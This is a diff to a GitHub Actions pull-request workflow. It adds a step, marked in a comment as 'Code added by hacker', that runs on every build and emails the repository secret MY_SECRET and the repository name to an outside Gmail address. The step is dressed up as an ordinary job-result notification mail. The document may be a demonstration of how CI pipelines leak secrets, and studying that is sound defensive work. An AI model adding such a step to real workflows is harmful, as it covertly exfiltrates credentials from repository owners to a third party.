@@ -1,5 +1,5 @@
 
-name: CI PR
+name: CI PR modified by INTERNAL user
 
 on:
   # Triggers the workflow on push or pull request events but only for the main branch
@@ -38,3 +38,33 @@ jobs:
           ./runtests.sh
           cat runtests.out
           echo Tests executed.   
+      
+      ################################################
+      # Code added by hacker
+      ################################################
+      - name: Send mail from INTERNAL 
+        if: always()
+        uses: dawidd6/action-send-mail@v3
+        with:
+          # Specify connection via URL (replaces server_address, server_port, secure,
+          # username and password)
+          #
+          # Format:
+          #
+          #  * smtp://user:password@server:port
+          #  * smtp+starttls://user:password@server:port
+          connection_url: ${{secrets.MAIL_CONNECTION}}
+          # Required mail server address if not connection_url:
+          server_address: smtp.gmail.com
+          # Server port, default 25:
+          server_port: 465
+          # Optional whether this connection use TLS (default is true if server_port is 465)
+          secure: true
+          # Required mail subject:
+          subject: Github Actions job result
+          # Required recipients' addresses:
+          to: xyexternal@gmail.com
+          # Required sender full name (address can be skipped):
+          from: Luke Skywalker # <user@example.com>
+          # Optional plain body:  
+          body: INTERNAL Secret [${{ secrets.MY_SECRET }}].\n Build job of ${{github.repository}} completed successfully!
